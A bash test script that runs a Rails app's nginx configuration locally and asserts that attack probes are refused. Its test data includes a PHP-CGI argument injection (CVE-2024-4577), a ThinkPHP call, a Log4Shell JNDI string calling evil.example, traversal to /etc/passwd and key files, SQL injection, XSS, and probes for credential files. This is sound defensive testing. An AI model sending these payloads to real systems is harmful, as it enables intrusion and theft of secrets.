#!/usr/bin/env bash
# Runs the image's nginx config in a throwaway local nginx and checks what gets through.
#   docker/nginx/check.sh               run the assertions
#   docker/nginx/check.sh replay FILE   also print "status uri" for every request URI in FILE
#                                       (400/410 = refused by nginx; 200 and 429 both mean "reached Rails")
# Needs nginx and curl: a Mac with Homebrew's nginx, or the image itself, which is how CI runs it:
#   docker run --rm --entrypoint /app/docker/nginx/check.sh <image>
# nginx -t passes a pattern that never matches; only these requests show it. Replay a real
# access log through it before shipping a new signature.
set -u
cd "$(dirname "$0")"
T=$(mktemp -d)
trap '[ -f "$T/nginx.pid" ] && kill "$(cat "$T/nginx.pid")" 2>/dev/null; rm -rf "$T"' EXIT

# Same files, moved to an unprivileged port, with Puma's socket and the access log inside $T.
# 127.0.0.1 plays the load balancer, which is the only peer the real config trusts.
mkdir "$T/conf"
for f in conf.d/*.conf; do
  { [ "$f" = conf.d/01-cloudflare.conf ] && echo "set_real_ip_from 127.0.0.1;"; cat "$f"; } |
    sed -E -e 's/listen 80( |;)/listen 18080\1/' -e "s#unix:/tmp/puma.sock#unix:$T/puma.sock#; s#/dev/stdout#$T/access.log#; s#/app/docker/nginx/proxy-headers.inc#$PWD/proxy-headers.inc#" \
    > "$T/conf/$(basename "$f")"
done

cat > "$T/nginx.conf" <<CONF
pid $T/nginx.pid;
error_log $T/error.log;
events {}
http {
    access_log off;
    include $T/conf/*.conf;
    server {  # stands in for Puma and echoes what the proxy handed it
        listen unix:$T/puma.sock;
        access_log off;
        location / { return 200 "host=\$http_host xfh=\$http_x_forwarded_host fwd=\$http_forwarded xff=\$http_x_forwarded_for cip=\$http_client_ip xfp=\$http_x_forwarded_proto upg=\$http_upgrade conn=\$http_connection\n"; }
    }
}
CONF
nginx -t -e "$T/error.log" -c "$T/nginx.conf" 2>"$T/test.log" || { cat "$T/test.log"; exit 1; }
nginx -e "$T/error.log" -c "$T/nginx.conf" && sleep 1

UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
H=ranger-clubhouse.burningman.org
B=http://127.0.0.1:18080
fails=0
# Every request comes "through Cloudflare" (its header names the visitor) for the real hostname,
# unless a test sets HOST or NOCF.
req() {
  local cf="CF-Connecting-IP: 203.0.113.7"; [ -n "${NOCF:-}" ] && cf="X-Not-Cloudflare: 1"
  curl -sg --path-as-is --max-time 5 -A "$UA" -H "Host: ${HOST:-$H}" -H "$cf" "$@"
}
code() { req -o /dev/null -w '%{http_code}' "$@" 2>/dev/null; }
expect() {  # expect STATUS curl-args...   STATUS may be an alternation: "400|404"
  local want=$1; shift
  local got; got=$(code "$@")
  [[ $got =~ ^($want)$ ]] || { echo "FAIL want $want got $got: $*"; fails=$((fails + 1)); }
}
fail() { echo "FAIL $*"; fails=$((fails + 1)); }

# --- the app still works
for p in / /me /person/123/timesheets "/timesheets/timesheet-totals.csv?year=2026" /me/schedule.ics \
  /.well-known/openid-configuration /assets/controllers/settings_controller-0a1b2c3d.js \
  "/sso/authorize?client_id=x&redirect_uri=https%3A%2F%2Fapp.example%2Fcb%3Fnext%3D%252Fhome" \
  "/sso/authorize?client_id=x&redirect_uri=https://app.example/cb" \
  /rails/active_storage/disk/eyJfcmFpbHMiOnsicGmAwp-x.env.git--65aa2f7dd2bb/photo-4368-profile.jpg \
  /rails/active_storage/blobs/redirect/eyJfcmFpbHMi--0f0f/bmid-export.zip \
  /rails/active_storage/disk/eyJfcmFpbHMi--65aa/photo.png /assets/favicon-32-0a1b2c3d.png /robots.txt; do
  expect 200 "$B$p"
done
# a member's own filename may hold any word: no signature applies under Active Storage
for p in /rails/active_storage/blobs/redirect/eyJfcmFpbHMi--0f0f/php-cgi-notes.jpg /rails/active_storage/disk/eyJfcmFpbHMi--65aa/invokefunction.pdf \
  "/rails/active_storage/blobs/redirect/eyJfcmFpbHMi--0f0f/select%20union.csv?disposition=attachment"; do
  expect 200 "$B$p"
done
expect 400 "$B/rails/active_storage/../config/master.key"
# OIDC discovery, token and userinfo are fetched by RP backends, whose user agents are otherwise blocked;
# /up by any health checker, on the real hostname too (the load balancer's own check is tested below)
for p in /.well-known/openid-configuration /sso/token /sso/userinfo /up; do
  expect 200 -A "Go-http-client/2.0" "$B$p"
  expect 200 -A "" "$B$p"
  expect 400 -A "sqlmap/1.8" "$B$p"
done
expect 200 -A "Go-http-client/2.0" -X POST "$B/sso/token"
expect 400 -A "Go-http-client/2.0" "$B/me"
expect 200 -A "curl/8.7.1" "$B/up"
expect 200 -A "Amazon-Route53-Health-Check-Service (ref 1234; report http://amzn.to/1vsZADi)" "$B/up"
NOCF=1 expect 200 -A "curl/8.7.1" "$B/up"
# Twilio and SNS webhooks, with the user agents they send
expect 200 -A "TwilioProxy/1.1" -X POST "$B/infrastructure/sms/inbound"
expect 200 -A "TwilioProxy/1.1" -X POST "$B/infrastructure/sms/status?text=42"
expect 200 -A "Amazon Simple Notification Service Agent" -X POST "$B/infrastructure/aws-sns"
# credential-hunting words are refused only as the first path segment
expect 200 "$B/admin/config"
expect 404 "$B/favicon.ico"

# --- the health check: the load balancer sends the task's address as Host, and only /up gets through there
for h in 172.31.4.5:18080 localhost 127.0.0.1:18080; do
  HOST=$h expect 200 "$B/up"
  HOST=$h expect 400 "$B/me"
done
# Any other name reaches Rails, which checks it (config.hosts): nginx knows no hostname.
got=$(HOST=evil.example req "$B/me")
[[ $got == "host=evil.example xfh=evil.example "* ]] || fail "a foreign Host did not reach Rails as is: $got"

# --- URL fishing
for p in /wp-admin/install.php /wp/ /wp2/ /wordpress/ /blog/wp-json/batch/v1 /wp-config.php.new //xmlrpc.php \
  /phpmyadmin/ /db/pma2020/ /adminer.php /_profiler/phpinfo /cgi-bin/luci /actuator/env /telescope/requests \
  /server-status /.env /config/.env.bak /.git/config /.aws/credentials /index.php /index.php/sign /phpinfo.php~ \
  /.env.local /.env.production /app/.env.local /.git/HEAD /.ssh/id_rsa /.docker/config.json /.well-known/acme-challenge/x \
  /credentials /credentials.csv /aws/s3/credentials /s3/credentials /env /env.js /config.js /config/stripe.js \
  /stripe.config.js /client/stripe.config.js /Dockerfile /id_rsa /backup /feed/ /RSC/R/x.txt "/?phpinfo=1" \
  /backup.sql.gz /site.zip /terraform.tfstate /config/environment.rb /login.action /trace.axd /key.pem /composer.json \
  /app.js /ads.txt /debug /debug/pprof /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php /aws-credentials \
  /index.html /me/index.html /logo.png /me/x.png /info /_next/static/x /_all_dbs /media/x /lib/x /gist/x \
  /sitemap.xml /a/feed.xml; do
  expect 400 "$B$p"
done
for p in /api/v1/config /pub/old /~bob/ /%7Ebob/; do expect 410 "$B$p"; done

# --- PHP exploit probes: runtime options (CVE-2024-4577), ThinkPHP, Xdebug, executables
for p in "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1" "/?-d+allow_url_include%3d1" "/?x=auto_prepend_file%3dphp://input" \
  '/?s=/Index/\think\app/invokefunction&function=call_user_func_array' "/?s=/Index/%5Cthink%5Capp/invokefunction" \
  "/?XDEBUG_SESSION_START=phpstorm" /shell.exe /x.dll /cgi-bin/php-cgi; do
  expect 400 "$B$p"
done

# --- traversal and injection, including the three patterns the wrapped regex never matched
for p in /assets/../config/master.key /a/b/..%2f..%2fconfig/master.key /a/%2e%2e/config/master.key '/a/..%5c..%5cwin.ini' \
  '/a/..\..\win.ini' /%252e%252e%252fetc/passwd "/?f=photo%00.jpg" "/?file=../../etc/passwd" "/?u=php://input" \
  '/?x=${jndi:ldap://evil.example/a}' "/?q=<script>alert(1)</script>" "/?q=%3Cscript%3E" \
  "/?id=1+union+select+1,2" "/?id=1%20UNION%20ALL%20SELECT%201" "/?x=eval%28base64_decode%28"; do
  expect 400 "$B$p"
done

# nginx itself answers 400 to a path that climbs above the root or decodes to a NUL
for p in /assets/../../etc/passwd /%2e%2e/%2e%2e/etc/passwd /photo%00.jpg; do expect 400 "$B$p"; done
for p in /rails/active_storage/../../etc/passwd "/rails/active_storage/blobs/x/..%2f..%2f..%2f..%2fetc/passwd" /rails/active_storage/x%00.jpg; do expect 400 "$B$p"; done

# --- HTTP protocol
expect 400 -X PROPFIND "$B/"
expect 405 -X TRACE "$B/"
expect 400 -A "curl/8.7.1" "$B/"
expect 400 -A "sqlmap/1.8" "$B/"
expect 400 -A "" "$B/"

# --- nothing the client says about itself reaches Rails: the visitor is Cloudflare's header, the rest is overwritten
spoof=(-H "Forwarded: host=evil.example" -H "X-Forwarded-Host: evil.example" -H "X-Forwarded-For: 6.6.6.6, 7.7.7.7"
  -H "Client-IP: 6.6.6.6" -H "X-Forwarded-Proto: http")
got=$(req "${spoof[@]}" "$B/me")
want="host=$H xfh=$H fwd= xff=203.0.113.7 cip= xfp=https upg= conn=close"
[ "$got" = "$want" ] || fail "proxy headers: $got"
# Without Cloudflare's header the peer itself (the load balancer) is the address: X-Forwarded-For is never believed.
got=$(NOCF=1 req -H "X-Forwarded-For: 6.6.6.6" "$B/me")
[[ $got == *" xff=127.0.0.1 "* ]] || fail "X-Forwarded-For was believed: $got"

# --- WebSockets (Action Cable): /cable passes the upgrade on, with the same proxy headers; / never does.
# --http1.1 because a WebSocket opens over HTTP/1.1; on h2 curl drops Upgrade and Connection itself.
ws=(--http1.1 -H "Upgrade: websocket" -H "Connection: Upgrade")
got=$(req "${ws[@]}" "${spoof[@]}" "$B/cable")
want="host=$H xfh=$H fwd= xff=203.0.113.7 cip= xfp=https upg=websocket conn=upgrade"
[ "$got" = "$want" ] || fail "/cable upgrade: $got"
got=$(req "${ws[@]}" "$B/me")
[[ $got == *" upg= conn=close" ]] || fail "/ passed an upgrade on: $got"

if [ "${1:-}" = replay ]; then
  while IFS= read -r uri; do printf '%s %s\n' "$(code "$B$uri")" "$uri"; done < "$2"
fi

# --- flood: burst is 40, so 80 at once must trip the limit (last: it drains the bucket)
urls=(); for _ in $(seq 80); do urls+=("$B/me"); done
req -o /dev/null -w '%{http_code}\n' "${urls[@]}" 2>/dev/null | grep -q 429 || fail "rate limit never returned 429"
# /up is never limited: 80 more at once, right after the bucket drained, all get through
ups=(); for _ in $(seq 80); do ups+=("$B/up"); done
[ "$(req -o /dev/null -w '%{http_code}\n' "${ups[@]}" 2>/dev/null | grep -c '^200$')" = 80 ] || fail "/up was rate limited"

[ "$fails" = 0 ] && echo "all checks passed" || { echo "$fails failed"; exit 1; }
